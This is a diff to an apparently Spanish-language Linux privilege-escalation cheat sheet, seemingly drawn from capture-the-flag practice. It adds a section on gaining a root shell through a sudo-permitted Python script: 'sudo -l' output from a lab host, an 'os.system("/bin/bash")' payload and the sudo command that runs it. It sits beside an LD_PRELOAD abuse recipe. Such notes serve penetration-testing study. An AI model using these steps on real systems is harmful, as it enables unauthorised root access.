@@ -83,6 +83,26 @@ Si ves `env_keep+=LD_PRELOAD` en la salida de `sudo -l`:
 2. Compilar: `gcc -fPIC -shared -o pe.so pe.c -nostartfiles`
 3. Ejecutar: `sudo LD_PRELOAD=/tmp/pe.so <comando_permitido>`
 
+##### Script editable
+Si puedes editar un script en bash o python y tiene permiso para ejecutar como root u otro usuario, ejemplo:
+```bash
+john@darkhole:/home/john$ sudo -l
+Matching Defaults entries for john on darkhole:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User john may run the following commands on darkhole:
+    (root) /usr/bin/python3 /home/john/file.py
+
+```
+
+Editar el script con el siguiente contenido, y lanzar:
+```bash
+import os; os.system("/bin/bash")
+
+sudo /usr/bin/python3 /home/john/file.py
+```
+
 ---
 
 ## 4. Permisos SUID / SGID
